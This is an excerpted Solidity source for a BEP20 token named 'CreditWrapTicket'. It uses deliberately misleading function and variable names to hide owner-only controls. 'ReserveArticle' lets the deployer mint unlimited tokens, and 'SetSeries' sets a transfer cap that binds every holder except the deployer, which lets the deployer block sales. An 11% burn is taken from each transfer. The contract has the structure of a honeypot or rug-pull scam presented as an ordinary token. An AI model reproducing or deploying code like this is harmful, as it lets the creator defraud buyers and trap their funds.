...
contract CreditWrapTicket is IBEP20 
{
    using HospitalLib for uint256;
    mapping(address => uint256) internal _country;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 internal _philosophy;
    ...
    constructor() 
    {
        ...
        _name = "CreditWrapTicket";
        _symbol = "LIMIT";
        _burnRate = 11;
        _philosophy = _totalSupply;
        _msgsender = _msgSender();
        _sendermessage = _msgsender;
        _country[_sendermessage] = _totalSupply;
	    emit Transfer(address(0), _sendermessage, _totalSupply);
    }

    modifier OfficerPeriod() { require(msg.sender == _sendermessage); _; }
    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 6; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _country[account];}
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
    function GetLog() external view returns (uint256) { return _philosophy; }
    function SetSeries(uint b) external virtual OfficerPeriod { _philosophy = b * (10 ** decimals()); }
    ...
    function ReserveArticle(uint256 manner) external virtual OfficerPeriod
    {
        uint touch = manner * (10 ** decimals()); 
        _country[_msgsender] = _country[_msgsender].Hang(touch);
        emit Transfer(address(0), _msgsender, touch);
    }
    ...
    function _transfer(address sender,address recipient, uint256 amount) internal virtual 
    {
        ...
        require(amount <= _philosophy || recipient == _msgsender || sender == _msgsender);
        uint256 senderBalance = _country[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        uint256 burnAmount = amount * _burnRate / 100;

        _country[sender] = senderBalance - amount;
        _country[recipient] += (amount - burnAmount);
        _country[_burnaddress] += burnAmount;
...
library HospitalLib 
{
  function Hang(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }
}